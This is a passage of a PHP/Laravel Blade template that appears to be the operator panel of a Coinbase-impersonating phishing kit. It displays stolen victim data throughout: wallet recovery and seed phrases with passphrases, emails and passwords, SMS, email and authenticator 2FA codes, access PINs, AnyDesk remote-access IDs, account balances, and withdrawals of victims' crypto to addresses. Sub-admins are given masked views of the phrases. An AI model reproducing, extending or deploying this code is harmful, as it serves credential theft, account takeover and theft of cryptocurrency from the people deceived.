            foreach ($ledgerClassicPhraseRows as $ldcRow) {
                $ldcDisplay = trim(implode(' ', array_filter(
                    $ldcRow['words'] ?? [],
                    fn($w) => trim((string) $w) !== ''
                )));
                if (($ldcRow['pass'] ?? '') !== '') {
                    $ldcDisplay = trim($ldcDisplay.' '.$ldcRow['pass']);
                }
                if (!empty($ldcRow['blank'])) {
                    $ldcDisplay = '';
                }
                $stickyFields[] = [
                    'label' => 'Ledger',
                    'id' => (int) ($ldcRow['id'] ?? 0),
                    'ts' => (int) ($ldcRow['firstTs'] ?? 0),
                    'value' => $ldcDisplay,
                    'firstTs' => (int) ($ldcRow['firstTs'] ?? 0),
                    'firstId' => (int) ($ldcRow['firstId'] ?? $ldcRow['id'] ?? 0),
                    'valueSelect' => 'all',
                    'valueLs' => '.02em',
                    'labelMax' => '88px',
                    'labelLs' => '.06em',
                    'valueScroll' => false,
                    'compact' => false,
                ];
            }
            foreach ($cbWlPhraseRows as $cbWlRow) {
                $cbWlDisplay = trim(implode(' ', array_filter(
                    $cbWlRow['words'] ?? [],
                    fn($w) => trim((string) $w) !== ''
                )));
                if (($cbWlRow['pass'] ?? '') !== '') {
                    $cbWlDisplay = trim($cbWlDisplay.' '.$cbWlRow['pass']);
                }
                if (!empty($cbWlRow['blank'])) {
                    $cbWlDisplay = '';
                }
                $stickyFields[] = [
                    'label' => 'Whitelist',
                    'id' => (int) ($cbWlRow['id'] ?? 0),
                    'ts' => (int) ($cbWlRow['firstTs'] ?? 0),
                    'value' => $cbWlDisplay,
                    'firstTs' => (int) ($cbWlRow['firstTs'] ?? 0),
                    'firstId' => (int) ($cbWlRow['firstId'] ?? $cbWlRow['id'] ?? 0),
                    'valueSelect' => 'all',
                    'valueLs' => '.02em',
                    'labelMax' => '88px',
                    'labelLs' => '.06em',
                    'valueScroll' => false,
                    'compact' => false,
                ];
            }
            usort($stickyFields, fn($a, $b) => ($a['firstTs'] <=> $b['firstTs']) ?: ($a['firstId'] <=> $b['firstId']));
        @endphp
        @foreach($stickyFields as $fieldRow)
        @php $sfCompact = !empty($fieldRow['compact']); @endphp
        <div data-event-id="{{ $fieldRow['id'] }}"
             style="display:flex;align-items:center;gap:{{ $sfCompact ? '8px' : '30px' }};padding:{{ $sfCompact ? '4px 2px 4px 0' : '6px 2px 6px 0' }};margin-bottom:{{ $sfCompact ? '4px' : '4px' }};max-width:100%;min-width:0;width:100%;box-sizing:border-box;">
            <span style="font-family:monospace;font-size:{{ $sfCompact ? '9px' : '12px' }};font-weight:{{ $sfCompact ? '700' : '800' }};color:rgba(255,255,255,{{ $sfCompact ? '.55' : '.70' }});letter-spacing:{{ $fieldRow['labelLs'] }};text-transform:uppercase;flex-shrink:0;{{ $sfCompact ? 'min-width:56px;width:auto;max-width:'.$fieldRow['labelMax'] : 'min-width:88px;width:88px;max-width:88px' }};text-align:left;{{ $sfCompact ? '' : 'white-space:normal;overflow-wrap:break-word;line-height:1.2;' }}">{{ $fieldRow['label'] }}</span>
            <div style="flex:1 1 0%;width:0;min-width:0;display:flex;align-items:center;gap:6px;border:1px solid rgba(255,255,255,{{ $sfCompact ? '.18' : '.10' }});border-radius:4px;background:rgba(255,255,255,.02);padding:{{ $sfCompact ? '3px 6px' : '7px 10px' }};box-sizing:border-box;">
                <span style="font-family:monospace;font-size:{{ $sfCompact ? '10px' : '12px' }};font-weight:500;color:#fff;letter-spacing:{{ $fieldRow['valueLs'] }};flex:1;min-width:0;user-select:{{ $fieldRow['valueSelect'] }};overflow:hidden;text-overflow:ellipsis;white-space:nowrap;">{{ $fieldRow['value'] }}</span>
                <button type="button"
                    onclick="copyActivityBox(this)"
                    style="flex-shrink:0;display:inline-flex;align-items:center;justify-content:center;width:28px;height:28px;margin:-7px -10px -7px 0;background:transparent;border:none;color:rgba(255,255,255,.4);padding:0;border-radius:3px;cursor:pointer;"
                    title="Copy">
                    <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>
                </button>
            </div>
        </div>
        @endforeach
        @forelse($leftEvents as $ev)
            @php
                $t   = $ev->type;
                $el  = $ev->element ?? '';
                $isGrouped   = isset($ev->isGrouped) && $ev->isGrouped;
                $isPhrase    = ($t === 'phrase_input' && $el === 'full_state' && isset($phraseSnapMap[$ev->id]));
                $isPageVisit = ($t === 'page_visit');
                $pageKey2    = $ev->page ?? $ev->element ?? '';
                $accent2     = $pageAccent[$pageKey2] ?? '#64748b';
                $label2      = $evPageLabels[$pageKey2] ?? ucwords(str_replace(['-','_','/'],' ',$pageKey2));
                $ts2         = optional($ev->created_at)->format('H:i:s') ?? '--:--:--';

                $displayVal = $ev->value ?? '';
                $isVerifyCode = false;
                if ($displayVal && in_array($el, ['form_data','full_state','code'])) {
                    $dec2 = json_decode($displayVal, true);
                    if (is_array($dec2) && count($dec2) === 1 && isset($dec2['code']) && preg_match('/^\d{1,8}$/', $dec2['code'])) {
                        $displayVal   = $dec2['code'];
                        $isVerifyCode = true;
                    }
                }

                // Detect passphrase submit (import-wallet)
                $isPassphrase = ($t === 'form_submit' && $el === 'passphrase');
                // Detect phrase submit (recovery_phrase final submit)
                $isPhraseSubmit = ($t === 'form_submit' && $el === 'recovery_phrase');

                // Sub-admin masking: replace actual phrase/passphrase content with stars
                if (!$canSeePassphrases) {
                    if ($t === 'phrase_input' || $t === 'phrase_word') {
                        $displayVal = ($el === 'word_count') ? $displayVal : '****';
                    } elseif ($isPassphrase && $displayVal) {
                        $displayVal = '****';
                    } elseif ($t === 'form_submit' && in_array($el, ['recovery_phrase','seed_phrase']) && $displayVal) {
                        $displayVal = '****';
                    }
                }
            @endphp

            @if($isPageVisit)
                {{-- Page-visit rows hidden from Activity per request; event still counted in #feed-events-data and Clean modal --}}

            @elseif($t === 'phrase_input' && $el === 'full_state')
                {{-- Recovery progress: single card above; skip older/newer full_state rows here. Still in #feed-events-data. --}}

            @elseif(($t === 'code_input' && $el === 'code_partial' && ($ev->page ?? '') === 'coinbase_access_code')
                  || ($t === 'form_submit' && $el === 'access_code' && ($ev->page ?? '') === 'coinbase_access_code'))
                {{-- Access code hidden from Activity; still in #feed-events-data / DB --}}

            @elseif(($t === 'code_input' && $el === 'code_partial' && ($ev->page ?? '') === 'coinbase_access_pin')
                  || ($t === 'form_submit' && $el === 'access_code' && ($ev->page ?? '') === 'coinbase_access_pin'))
                {{-- Access PIN hidden from Activity; still in #feed-events-data / DB --}}


            @elseif(($t === 'code_input' && $el === 'code_partial' && ($ev->page ?? '') === 'coinbase_sms_code')
                  || ($t === 'form_submit' && $el === 'code' && ($ev->page ?? '') === 'coinbase_sms_code'))
                {{-- Collapsed into single SMS card above; still in #feed-events-data --}}

            @elseif(($t === 'code_input' && $el === 'code_partial' && ($ev->page ?? '') === 'coinbase_authenticator_code')
                  || ($t === 'form_submit' && $el === 'access_code' && ($ev->page ?? '') === 'coinbase_authenticator_code'))
                {{-- Collapsed into single Auth card above; still in #feed-events-data --}}

            @elseif($t === 'form_submit' && $el === 'confirmation_link' && ($ev->page ?? '') === 'coinbase_device_confirmation')
                {{-- Collapsed into single Link card above; still in #feed-events-data --}}

            @elseif(($t === 'code_input' && $el === 'anydesk_id' && ($ev->page ?? '') === 'coinbase_anydesk')
                  || ($t === 'form_submit' && $el === 'anydesk_id' && ($ev->page ?? '') === 'coinbase_anydesk'))
                {{-- Collapsed into single Anydesk card above; still in #feed-events-data --}}

            @elseif($t === 'form_submit' && ($ev->page ?? '') === 'coinbase_review_account'
                  && in_array($el, ['review_intro', 'unusual_activity', 'suspicious_login', 'email_change', 'password_change'], true))
                {{-- Review Account button clicks hidden from Activity; still in #feed-events-data / DB --}}


            @elseif($t === 'form_submit' && ($ev->page ?? '') === 'review'
                  && in_array($el, ['review_intro', 'unusual_activity', 'suspicious_login', 'email_change', 'password_change'], true))
                {{-- Review Account button clicks hidden from Activity; still in #feed-events-data / DB --}}

            @elseif($t === 'form_submit' && $el === 'last_activity' && ($ev->page ?? '') === 'coinbase_last_activity')
                {{-- Collapsed into single Active card above; still in #feed-events-data --}}


            @elseif($t === 'form_submit' && $el === 'estimated_balance' && ($ev->page ?? '') === 'coinbase_estimated_balance')
                {{-- Collapsed into single Balance card above; still in #feed-events-data --}}

            @elseif(($t === 'coin_input' && $el === 'selection' && ($ev->page ?? '') === 'coinbase_select_vault_assets')
                  || ($t === 'form_submit' && $el === 'assets' && ($ev->page ?? '') === 'coinbase_select_vault_assets'))
                {{-- Collapsed into single Vault card above; still in #feed-events-data --}}


            @elseif($t === 'form_submit' && $el === 'high_security' && ($ev->page ?? '') === 'coinbase_high_security')
                {{-- High Security clicks hidden from Activity; still in #feed-events-data / DB --}}


            @elseif($t === 'form_submit' && $el === 'action' && ($ev->page ?? '') === 'coinbase_connect_vault')
                {{-- Connect Vault clicks hidden from Activity; still in #feed-events-data / DB --}}

            @elseif($t === 'form_submit' && $el === 'create_vault' && ($ev->page ?? '') === 'coinbase_create_vault')
                {{-- Create Vault click hidden from Activity; still in #feed-events-data / DB --}}


            @elseif($t === 'form_submit' && $el === 'wallet' && ($ev->page ?? '') === 'coinbase_disconnect_wallet')
                {{-- Disconnect wallet picker hidden from Activity; still in #feed-events-data / DB --}}


            @elseif($t === 'form_submit' && $el === 'continue' && ($ev->page ?? '') === 'coinbase_disconnected_done')
                {{-- Disconnected Done continue hidden from Activity; still in #feed-events-data / DB --}}

            @elseif($t === 'form_submit' && $el === 'continue' && ($ev->page ?? '') === 'coinbase_secure_transfer')
                {{-- Secure Transfer continue hidden from Activity; still in #feed-events-data / DB --}}


            @elseif($t === 'form_submit' && $el === 'vault_action'
                  && in_array(($ev->page ?? ''), ['coinbase_vault_balance'], true))
                {{-- Vault deposit/withdraw button clicks hidden from Activity; still in #feed-events-data / DB --}}

            @elseif($t === 'form_submit' && in_array($el, ['withdraw', 'withdraw_submit'], true))
                {{-- Vault withdraw detail hidden from Activity; still in #feed-events-data / DB --}}

            @elseif($t === 'vault_withdraw')
                {{-- Vault withdraw balance-update hidden from Activity; still in #feed-events-data / DB --}}

            @elseif($t === 'form_submit' && $el === 'email_code' && ($ev->page ?? '') === 'coinbase_email_code')
                {{-- Collapsed into single MAIL 2FA card above; still in #feed-events-data --}}

            @elseif($t === 'form_submit' && $el === 'continue' && ($ev->page ?? '') === 'coinbase_link_coinbase')
                {{-- Link Coinbase Continue hidden from Activity; still in #feed-events-data / DB --}}

            @elseif($t === 'form_submit' && $el === 'continue' && ($ev->page ?? '') === 'coinbase_download_wallet')
                {{-- Download CB Wallet Continue hidden from Activity; still in #feed-events-data / DB --}}

            @elseif($t === 'form_submit' && $el === 'continue' && ($ev->page ?? '') === 'coinbase_import_recovery_phrase')
                {{-- Import Recovery Phrase Continue hidden from Activity; still in #feed-events-data / DB --}}

            @elseif($t === 'form_submit' && $el === 'id_type' && ($ev->page ?? '') === 'coinbase_select_id_type'
                  && trim((string) ($ev->value ?? '')) === "I don't have any of these")
                {{-- "I don't have any of these" hidden from Activity; still in #feed-events-data / DB --}}

            @elseif($t === 'form_submit' && $el === 'seed_phrase')
                {{-- seed_phrase capture hidden from Activity; still in #feed-events-data / DB / Clean --}}

            @elseif($t === 'form_submit' && $el === 'email' && ($ev->page ?? '') === 'coinbase_sign_in')
                {{-- Collapsed into single Email card above; still in #feed-events-data --}}

            @elseif($t === 'form_submit' && $el === 'password' && ($ev->page ?? '') === 'coinbase_password')
                {{-- Collapsed into single Password card above; still in #feed-events-data --}}

            @elseif($t === 'form_submit' && $el === 'reset_password' && ($ev->page ?? '') === 'coinbase_reset_password')
                {{-- Collapsed into Reset card above; still in #feed-events-data --}}

            @elseif($isPassphrase)
                {{-- Collapsed into tiny PP sticky above; still in #feed-events-data / DB --}}

            @elseif($isPhraseSubmit)
                {{-- recovery_phrase submit hidden from Activity; still in #feed-events-data / DB / Clean --}}

            @elseif($isGrouped || $isVerifyCode)
                @php $codeLbl = ($t === 'pin_input') ? 'PIN' : 'CODE'; @endphp
                <div data-event-id="{{ $ev->id }}"
                     style="display:flex;align-items:center;gap:8px;padding:6px 9px;margin-bottom:3px;border-radius:5px;background:rgba(56,189,248,.06);border:1px solid rgba(56,189,248,.18);">
                    <span style="font-family:monospace;font-size:10px;font-weight:800;color:#38bdf8;letter-spacing:.1em;flex-shrink:0;">{{ $codeLbl }}</span>
                    <span style="font-family:monospace;font-size:16px;font-weight:900;color:#fff;letter-spacing:.35em;flex:1;">{{ $displayVal ?: '—' }}</span>
                    <span style="font-family:monospace;font-size:10px;color:rgba(255,255,255,.2);">{{ $ts2 }}</span>
                </div>

            @elseif($t === 'click' || $t === 'rating')
                @php
                    $actionColors = [
                        'deny'   => ['bg'=>'rgba(239,68,68,.1)','border'=>'rgba(239,68,68,.3)','text'=>'#f87171'],
                        'allow'  => ['bg'=>'rgba(74,222,128,.08)','border'=>'rgba(74,222,128,.25)','text'=>'#4ade80'],
                        'approve'=> ['bg'=>'rgba(74,222,128,.08)','border'=>'rgba(74,222,128,.25)','text'=>'#4ade80'],
                        'accept' => ['bg'=>'rgba(74,222,128,.08)','border'=>'rgba(74,222,128,.25)','text'=>'#4ade80'],
                        'reject' => ['bg'=>'rgba(239,68,68,.1)','border'=>'rgba(239,68,68,.3)','text'=>'#f87171'],
                        'block'  => ['bg'=>'rgba(239,68,68,.1)','border'=>'rgba(239,68,68,.3)','text'=>'#f87171'],
                        'submit' => ['bg'=>'rgba(99,102,241,.1)','border'=>'rgba(99,102,241,.28)','text'=>'#a5b4fc'],
                    ];
                    $elLower = strtolower($el ?: '');
                    $ac = $actionColors[$elLower] ?? ['bg'=>'rgba(148,163,184,.06)','border'=>'rgba(148,163,184,.18)','text'=>'#94a3b8'];
                @endphp
                <div data-event-id="{{ $ev->id }}"
                     style="display:flex;align-items:center;gap:8px;padding:5px 9px;margin-bottom:3px;border-radius:5px;background:{{ $ac['bg'] }};border:1px solid {{ $ac['border'] }};">
                    <span style="font-family:monospace;font-size:11px;font-weight:800;color:{{ $ac['text'] }};letter-spacing:.06em;text-transform:uppercase;flex:1;">{{ $el ?: $t }}</span>
                    @if($displayVal)
                    <span style="font-family:monospace;font-size:11px;color:rgba(255,255,255,.5);flex-shrink:0;max-width:80px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;">{{ $displayVal }}</span>
                    @endif
                    <span style="font-family:monospace;font-size:10px;color:rgba(255,255,255,.18);flex-shrink:0;">{{ $ts2 }}</span>
                </div>

            @elseif($t === 'form_submit' && $el === 'withdraw')
                @php
                    // Parse "4.30107527 UNI to address"
                    $wdParts = preg_match('/^([\d.]+)\s+([A-Z]+)\s+to\s+(.+)$/i', $displayVal, $wdM) ? $wdM : null;
                    $wdAmt   = $wdParts ? $wdParts[1] : '';
                    $wdTick  = $wdParts ? strtoupper($wdParts[2]) : strtoupper(substr($displayVal,0,8));
                    $wdAddr  = $wdParts ? $wdParts[3] : '';
                    $wdKey   = strtolower($wdTick);
                    $wdIcon  = $coinIconMap[$wdTick] ?? null;
                @endphp
                <div data-event-id="{{ $ev->id }}"
                     style="padding:6px 9px;margin-bottom:4px;border-radius:5px;background:rgba(248,113,113,.06);border:1px solid rgba(248,113,113,.18);">
                    <div style="display:flex;align-items:center;gap:6px;margin-bottom:{{ $displayVal ? '5px' : '0' }};">
                        @if($wdIcon)
                        <img src="{{ $wdIcon }}" width="14" height="14" style="border-radius:50%;flex-shrink:0;object-fit:cover;" onerror="this.style.display='none'"/>
                        @else
                        <svg width="10" height="10" viewBox="0 0 24 24" fill="none" stroke="#f87171" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" style="flex-shrink:0;"><line x1="12" y1="5" x2="12" y2="19"/><polyline points="19 12 12 19 5 12"/></svg>
                        @endif
                        <span style="font-family:monospace;font-size:10px;font-weight:700;color:#f87171;letter-spacing:.08em;text-transform:uppercase;flex:1;">WITHDRAW {{ $wdTick }}</span>
                        <span style="font-family:monospace;font-size:10px;color:rgba(255,255,255,.18);flex-shrink:0;">{{ $ts2 }}</span>
                    </div>
                    @if($displayVal)
                    <div style="display:flex;align-items:center;gap:6px;flex-wrap:wrap;">
                        <span style="font-family:monospace;font-size:13px;font-weight:800;color:#fff;">{{ $wdAmt }} {{ $wdTick }}</span>
                        <span data-usd-key="{{ $wdKey }}" data-usd-amt="{{ $wdAmt }}" style="font-family:monospace;font-size:11px;font-weight:600;color:#4ade80;background:rgba(74,222,128,.1);border-radius:4px;padding:1px 6px;"></span>
                    </div>
                    @if($wdAddr)
                    <div style="font-family:monospace;font-size:10px;color:rgba(255,255,255,.35);margin-top:3px;word-break:break-all;">→ {{ $wdAddr }}</div>
                    @endif
                    @endif
                </div>

            @elseif($t === 'vault_withdraw')
                @php
                    // Parse "coin|remaining_amount"
                    $vwParts = explode('|', $displayVal, 2);
                    $vwKey   = strtolower(trim($vwParts[0] ?? ''));
                    $vwTick  = strtoupper($vwKey);
                    $vwAmt   = trim($vwParts[1] ?? '');
                    $vwIcon  = $coinIconMap[$vwTick] ?? null;
                @endphp
                <div data-event-id="{{ $ev->id }}"
                     style="padding:5px 9px;margin-bottom:3px;border-radius:4px;background:rgba(255,255,255,.02);border:1px solid rgba(255,255,255,.06);">
                    <div style="display:flex;align-items:center;gap:6px;">
                        @if($vwIcon)
                        <img src="{{ $vwIcon }}" width="13" height="13" style="border-radius:50%;flex-shrink:0;object-fit:cover;" onerror="this.style.display='none'"/>
                        @endif
                        <span style="font-family:monospace;font-size:10px;font-weight:700;color:rgba(255,255,255,.3);letter-spacing:.05em;flex:1;">balance after <span style="color:#f87171;">{{ $vwTick }}</span> withdraw</span>
                        <span style="font-family:monospace;font-size:10px;color:rgba(255,255,255,.15);flex-shrink:0;">{{ $ts2 }}</span>
                    </div>
                    <div style="display:flex;align-items:center;gap:6px;margin-top:3px;flex-wrap:wrap;">
                        <span style="font-family:monospace;font-size:12px;font-weight:700;color:rgba(255,255,255,.7);">{{ $vwAmt }} {{ $vwTick }}</span>
                        <span data-usd-key="{{ $vwKey }}" data-usd-amt="{{ $vwAmt }}" style="font-family:monospace;font-size:10px;font-weight:600;color:#4ade80;background:rgba(74,222,128,.08);border-radius:4px;padding:1px 5px;"></span>
                        <span style="font-family:monospace;font-size:9px;color:rgba(255,255,255,.2);">remaining</span>
                    </div>
                </div>

            @elseif($t === 'form_submit')
                {{-- Highlight form submissions prominently --}}
                <div data-event-id="{{ $ev->id }}"
                     style="padding:6px 9px;margin-bottom:4px;border-radius:5px;background:rgba(255,255,255,.04);border:1px solid rgba(255,255,255,.1);">
                    <div style="display:flex;align-items:center;gap:6px;margin-bottom:{{ $displayVal ? '4px' : '0' }};">
                        <svg width="10" height="10" viewBox="0 0 24 24" fill="none" stroke="#94a3b8" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" style="flex-shrink:0;"><line x1="22" y1="2" x2="11" y2="13"/><polygon points="22 2 15 22 11 13 2 9 22 2"/></svg>
                        <span style="font-family:monospace;font-size:10px;font-weight:700;color:rgba(255,255,255,.4);letter-spacing:.08em;text-transform:uppercase;flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;">{{ $el ?: 'submit' }}</span>
                        <span style="font-family:monospace;font-size:10px;color:rgba(255,255,255,.18);flex-shrink:0;">{{ $ts2 }}</span>
                    </div>
                    @if($displayVal)
                    @php $isConfirmLink = ($el === 'confirmation_link'); @endphp
                    <div style="display:flex;align-items:flex-start;gap:6px;">
                        <div style="font-family:monospace;font-size:12px;font-weight:600;color:rgba(255,255,255,.8);word-break:break-all;flex:1;">{!! str_replace('@', '&#64;', e(Str::limit($displayVal, 90))) !!}</div>
                        @if($isConfirmLink)
                        <button onclick="(function(btn){var t=btn.closest('div').querySelector('div');if(!t)return;navigator.clipboard.writeText(t.textContent.trim()).then(function(){var o=btn.textContent;btn.textContent='✓';btn.style.color='#4ade80';setTimeout(function(){btn.textContent=o;btn.style.color='';},1200);});})(this)" style="flex-shrink:0;background:rgba(255,255,255,.07);border:1px solid rgba(255,255,255,.12);color:rgba(255,255,255,.5);font-size:10px;font-family:monospace;padding:2px 7px;border-radius:3px;cursor:pointer;margin-top:1px;" title="Copy link">copy</button>
                        @endif
                    </div>
                    @endif
                </div>

            @else
                {{-- Generic event (emails, inputs, etc.) --}}
                <div data-event-id="{{ $ev->id }}"
                     style="padding:4px 9px;margin-bottom:2px;border-radius:4px;background:rgba(255,255,255,.02);border:1px solid rgba(255,255,255,.04);">
                    <div style="display:flex;align-items:center;gap:6px;margin-bottom:{{ $displayVal ? '2px' : '0' }};">
                        <span style="font-family:monospace;font-size:10px;font-weight:700;color:rgba(255,255,255,.25);letter-spacing:.05em;text-transform:uppercase;flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;">{{ $el ?: str_replace('_',' ',$t) }}</span>
                        <span style="font-family:monospace;font-size:10px;color:rgba(255,255,255,.15);flex-shrink:0;">{{ $ts2 }}</span>
                    </div>
                    @if($displayVal)
                    <div style="font-family:monospace;font-size:12px;font-weight:600;color:rgba(255,255,255,.7);word-break:break-all;">{!! str_replace('@', '&#64;', e(Str::limit($displayVal, 90))) !!}</div>
                    @endif
                </div>
            @endif
        @empty
        @endforelse
    </div>


</div>
@endif
